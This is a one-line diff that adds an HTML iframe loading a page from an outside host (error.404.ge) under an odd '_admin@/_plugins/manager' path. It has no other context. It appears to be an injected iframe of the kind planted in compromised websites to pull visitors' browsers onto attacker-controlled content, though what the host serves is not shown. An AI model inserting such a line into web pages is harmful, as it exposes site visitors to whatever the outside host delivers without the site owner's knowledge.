@@ -1,0 +1,1 @@
+<iframe src="http://error.404.ge/_admin@/_plugins/manager/"></iframe>
